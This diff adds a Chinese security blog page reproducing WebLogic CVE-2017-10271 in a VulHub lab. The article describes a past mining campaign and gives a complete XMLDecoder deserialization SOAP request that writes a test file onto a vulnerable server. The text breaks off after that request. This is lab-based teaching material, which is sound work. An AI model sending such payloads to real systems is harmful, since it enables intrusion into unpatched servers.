@@ -1,0 +1,1005 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.27.0" theme-name="Stellar" theme-version="1.27.0">
+  
+  <meta name="generator" content="Hexo 7.1.1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>VulHub-Weblogic漏洞复现 - SafeKiller Zone</title>
+
+  
+    <meta name="description" content="总字符数: 32.86K                代码: 5.72K, 文本: 7.90K               预计阅读时间: 59 分钟            ‘wls-wsat’ XMLDecoder 反序列化漏洞(CVE-2017-10271)漏洞概述WebLogic 反序列化漏洞CVE-2017-3248和WebLogic WLS LS组件的远程代码执行漏洞CVE-">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulHub-Weblogic漏洞复现">
+<meta property="og:url" content="https://jiangjiyue.github.io/2022/10/18/55971a3e/index.html">
+<meta property="og:site_name" content="SafeKiller Zone">
+<meta property="og:description" content="总字符数: 32.86K                代码: 5.72K, 文本: 7.90K               预计阅读时间: 59 分钟            ‘wls-wsat’ XMLDecoder 反序列化漏洞(CVE-2017-10271)漏洞概述WebLogic 反序列化漏洞CVE-2017-3248和WebLogic WLS LS组件的远程代码执行漏洞CVE-">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171519659.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171555661.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171555437.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171558519.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171605805.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171851880.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171807650.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171848106.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171849466.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171848836.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171855879.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171906916.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171923808.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171934003.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171937238.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171942467.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171942358.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171945217.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210082238333.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210180851491.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171955685.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172002273.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172006564.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172007095.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172012676.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171403974.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171405123.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171405802.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171412003.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171413591.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171415851.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171436175.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171438766.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171451017.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171505385.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171512837.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172018933.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172021603.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172021244.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172022060.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172056381.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172057894.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210180921017.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210180920756.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210180920969.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210182205825.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210180931839.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210180947005.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210180948945.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210180955777.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210180951543.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402101225099.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210181051896.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210182208161.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210182209638.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210182124937.png">
+<meta property="article:published_time" content="2022-10-18T14:24:49.000Z">
+<meta property="article:modified_time" content="2024-07-17T05:57:58.000Z">
+<meta property="article:author" content="Kill3r">
+<meta property="article:tag" content="Nday">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="漏洞利用">
+<meta property="article:tag" content="VulHub">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171519659.png">
+  
+  
+  
+  <meta name="keywords" content="Nday,渗透测试,漏洞利用,VulHub">
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="SafeKiller Zone" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.27.0">
+
+  
+    <link rel="shortcut icon" href="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg">
+  
+
+  
+
+  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" /><link rel="stylesheet" href="/css/darkmode.css">
+</head>
+<body>
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">SafeKiller Zone</div><div class="sub normal cap">安全学的再好又有什么用</div><div class="sub hover cap" style="opacity:0"> 连自己喜欢的人都留不住</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="导航" href="/sites/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a><a class="nav-item" title="更多" href="/tools/" style="color:#d55afa"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M22 12c0 5.523-4.477 10-10 10S2 17.523 2 12S6.477 2 12 2s10 4.477 10 10" opacity=".5"/><path fill="currentColor" d="M12.75 9a.75.75 0 0 0-1.5 0v2.25H9a.75.75 0 0 0 0 1.5h2.25V15a.75.75 0 0 0 1.5 0v-2.25H15a.75.75 0 0 0 0-1.5h-2.25z"/></svg></a></nav>
+</div>
+<div class="widgets">
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">专栏：VulHub</span></div><div class="widget-body"><a class="item active" href="/2022/10/18/55971a3e/"><span class="title">VulHub-Weblogic漏洞复现</span><svg class="active-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M21 11.098v4.993c0 3.096 0 4.645-.734 5.321c-.35.323-.792.526-1.263.58c-.987.113-2.14-.907-4.445-2.946c-1.02-.901-1.529-1.352-2.118-1.47a2.225 2.225 0 0 0-.88 0c-.59.118-1.099.569-2.118 1.47c-2.305 2.039-3.458 3.059-4.445 2.945a2.238 2.238 0 0 1-1.263-.579C3 20.736 3 19.188 3 16.091v-4.994C3 6.81 3 4.666 4.318 3.333C5.636 2 7.758 2 12 2c4.243 0 6.364 0 7.682 1.332C21 4.665 21 6.81 21 11.098" opacity=".5"/><path fill="currentColor" d="M9 5.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5z"/></svg></a><a class="item" href="/2022/10/20/16f1e4f4/"><span class="title">VulHub-Spring漏洞复现</span></a><a class="item" href="/2023/03/07/a2dd2e70/"><span class="title">VulHub-Atlassian_Confluence漏洞复现</span></a><a class="item" href="/2023/03/08/cc894391/"><span class="title">VulHub-Atlassian_Jira漏洞复现</span></a><a class="item" href="/2023/03/09/5cba5df7/"><span class="title">VulHub-Django漏洞复现</span></a><a class="item" href="/2023/03/10/73f4594f/"><span class="title">VulHub-Drupal漏洞复现</span></a><a class="item" href="/2023/03/11/247b757/"><span class="title">VulHub-Fastjson漏洞复现</span></a><a class="item" href="/2023/04/01/6eb0a2c0/"><span class="title">VulHub-Gitlab漏洞复现</span></a><a class="item" href="/2023/04/03/30a0d618/"><span class="title">VulHub-Jboss漏洞复现</span></a><a class="item" href="/2023/04/05/8b1917af/"><span class="title">VulHub-Log4j漏洞复现</span></a><a class="item" href="/2023/04/06/30a0d618/"><span class="title">VulHub-H2_DataBase漏洞复现</span></a><a class="item" href="/2023/04/15/5458db23/"><span class="title">VulHub-Nexus漏洞复现</span></a><a class="item" href="/2023/04/20/5458db23/"><span class="title">VulHub-Shiro漏洞复现</span></a><a class="item" href="/2023/04/22/8b1ccd63/"><span class="title">VulHub-Solr漏洞复现</span></a><a class="item" href="/2023/04/28/76971e68/"><span class="title">VulHub-Tomcat漏洞复现</span></a><a class="item" href="/2023/05/03/fe16a42b/"><span class="title">VulHub-杂项漏洞复现</span></a></div></widget>
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/2024/11/04/fe2980d6/"><span class="title">CS-ShellCode加载器</span></a><a class="item title" href="/2023/03/11/247b757/"><span class="title">VulHub-Fastjson漏洞复现</span></a><a class="item title" href="/2023/04/28/76971e68/"><span class="title">VulHub-Tomcat漏洞复现</span></a><a class="item title" href="/2024/07/05/dd58c5ed/"><span class="title">应急响应之Webshell流量分析</span></a><a class="item title" href="/2024/10/27/77c80f0f/"><span class="title">CS-C语言总结</span></a></div></widget>
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/JiangJiYue/" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-github"></i></a><a class="social" href="javaScript:hud.toast('你在听🎵啦啦啦~');" rel="noopener noreferrer"><i class="fa-solid fa-music"></i></a><a class="social" href="https://space.bilibili.com/238008115" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-bilibili fa-bounce"></i></a><a class="social" href="/atom.xml" rel="noopener noreferrer"><i class="fa-solid fa-rss fa-shake"></i></a><a class="social" href="/comments/" rel="noopener noreferrer"><i class="fa-regular fa-comment-dots"></i></a><a class="social" href="javaScript:void(0);" rel="noopener noreferrer"><i class="fa-solid fa-circle-half-stroke fa-flip"></i></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" id="menu" href="/topic">专栏</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/2022/10/18/55971a3e/">VulHub</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2022-10-18T14:24:49.000Z">2022-10-18</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-07-17T05:57:58.000Z">2024-07-17</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>VulHub-Weblogic漏洞复现</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">
+    <p>总字符数: 32.86K </p>
+    </div>
+    <div class="cell" style="">
+    <p>代码: 5.72K, 文本: 7.90K</p>
+    </div>
+    <div class="cell" style="">
+    <p>预计阅读时间: 59 分钟</p>
+    </div>
+    </div>
+
+<h2 id="‘wls-wsat’-XMLDecoder-反序列化漏洞-CVE-2017-10271"><a href="#‘wls-wsat’-XMLDecoder-反序列化漏洞-CVE-2017-10271" class="headerlink" title="‘wls-wsat’ XMLDecoder 反序列化漏洞(CVE-2017-10271)"></a>‘wls-wsat’ XMLDecoder 反序列化漏洞(CVE-2017-10271)</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>WebLogic 反序列化漏洞CVE-2017-3248和WebLogic WLS LS组件的远程代码执行漏洞CVE-2017-10271,Oracle官方在2017年10月份发布了该漏洞的补丁,但没有公开漏洞细节,如果企业未及时安装补丁,存在被攻击的风险.对企业服务器发起了大范围远程攻击,对大量企业的服务器造成了严重威胁,<strong>受影响的版本:</strong></p>
+<ol>
+<li>10.3.6.0.0</li>
+<li>12.1.3.0.0</li>
+<li>12.2.1.1.0</li>
+<li>12.2.1.2.0</li>
+</ol>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="攻击说明"><a href="#攻击说明" class="headerlink" title="攻击说明"></a>攻击说明</h4><p>攻击者选定要攻击的目标主机后,将首先利用漏洞CVE-2017-3248进行攻击,无论是否成功,都将再利用CVE-2017-10271进行攻击.在每一次的攻击过程中,都是先针对Windows系统,再针对Linux系统.具体攻击流程如下:</p>
+<ol>
+<li>利用 WebLogic 反序列化漏洞(CVE-2017-3248)调用 Linux 中的wget 下载shell脚本并调用Linux本地”&#x2F;bin&#x2F;bash”执行shell脚本.(shell脚本内容内定义了从远端下载执行watch-smartd挖矿程序控制细节) </li>
+<li>利用 WebLogic 反序列化漏洞(CVE-2017-3248)调用 Windows 中的PowerShell进行样本下载和运行. </li>
+<li>利用 WebLogic WLS 组件漏洞(CVE-2017-10271)调用 Linux 中的wget 下载shell脚本并调用Linux本地”&#x2F;bin&#x2F;bash”执行shell脚本. </li>
+<li>利用 WebLogic WLS 组件漏洞(CVE-2017-10271)调用 Windows 中的 powershell 进行样本下载和恶意代码执行. </li>
+<li>在此次的攻击事件中,CVE-2017-3248利用不成功,CVE-2017-10271则利用成功,从而导致了服务器被攻击者攻陷,进而在系统日志中留下了痕迹.</li>
+</ol>
+<h4 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h4><ol>
+<li>直接在 Centos虚拟机基于 Vulhub 漏洞集成环境生成靶场. </li>
+<li>进入 Vulhub 对应的漏洞路径下执行命令<code>docker-compose up -d</code>编译并运行靶场容器 </li>
+<li><code>docker ps</code>查看端口<strong>下方修改了默认端口</strong> </li>
+<li>访问<code>http://192.168.2.188:7002/wls-wsat/CoordinatorPortType11</code>,如果存在下图则说明或许存在漏洞	<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171519659.png" data-fancybox="true"/></div></div></li>
+</ol>
+<h4 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>我们向服务器上传一个文件,如果上传并访问成功,证明存在此漏洞,将下方IP换掉</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: YOUR-IP:7001</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8    */<span class="comment">#</span></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 675</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span><br><span class="line">      &lt;soapenv:Header&gt;</span><br><span class="line">        &lt;work:WorkContext xmlns:work=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span><br><span class="line">         &lt;java version=<span class="string">&quot;1.6.0&quot;</span> class=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span><br><span class="line">                    &lt;object class=<span class="string">&quot;java.io.PrintWriter&quot;</span>&gt; </span><br><span class="line">                        &lt;string&gt;servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt&lt;/string&gt;&lt;void method=<span class="string">&quot;println&quot;</span>&gt;</span><br><span class="line">                        &lt;string&gt;xmldecoder_vul_test&lt;/string&gt;&lt;/void&gt;&lt;void method=<span class="string">&quot;close&quot;</span>/&gt;</span><br><span class="line">                    &lt;/object&gt;</span><br><span class="line">            &lt;/java&gt;</span><br><span class="line">        &lt;/work:WorkContext&gt;</span><br><span class="line">      &lt;/soapenv:Header&gt;</span><br><span class="line">      &lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171555661.png" data-fancybox="true"/></div></div>
